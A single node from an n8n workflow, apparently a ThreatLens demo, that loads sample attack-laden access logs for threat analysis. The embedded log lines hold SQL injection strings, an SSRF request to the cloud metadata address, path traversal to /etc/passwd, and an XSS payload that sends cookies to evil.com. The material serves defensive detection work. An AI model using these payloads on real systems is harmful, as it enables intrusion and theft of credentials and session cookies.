    {
      "id": "6b84751b-073b-46c3-97f6-5c2d7e9ab3d0",
      "name": "Load Demo Logs",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        -560,
        0
      ],
      "parameters": {
        "jsCode": "const cfg = $('Config').first().json;\nconst content = `# Demo subset from sample_attack_logs.log\n198.51.100.12 - - [23/May/2026:08:05:10 +0000] \"GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 400 512 \"-\" \"sqlmap/1.7\"\n198.51.100.12 - - [23/May/2026:08:05:12 +0000] \"GET /products?category=shoes%27%20OR%201=1-- HTTP/1.1\" 400 324 \"-\" \"sqlmap/1.7\"\n203.0.113.99 - - [23/May/2026:08:10:20 +0000] \"GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"\n45.33.32.156 - - [23/May/2026:08:15:05 +0000] \"GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1\" 400 256 \"-\" \"Mozilla/5.0\"\n192.0.2.77 - - [23/May/2026:08:20:30 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 256 \"-\" \"Mozilla/5.0\"\n203.0.113.42 - - [23/May/2026:08:35:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n203.0.113.42 - - [23/May/2026:08:35:01 +0000] \"GET /.env HTTP/1.1\" 403 64 \"-\" \"Mozilla/5.0\"`;\nconst logs = content.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#')).slice(-500);\nreturn [{ json: {\n  session_id: $('Create ThreatLens Session').first().json.session_id,\n  base_url: cfg.base_url,\n  source_type: cfg.source_type,\n  logs,\n  log_count: logs.length\n} }];"
      }
    },
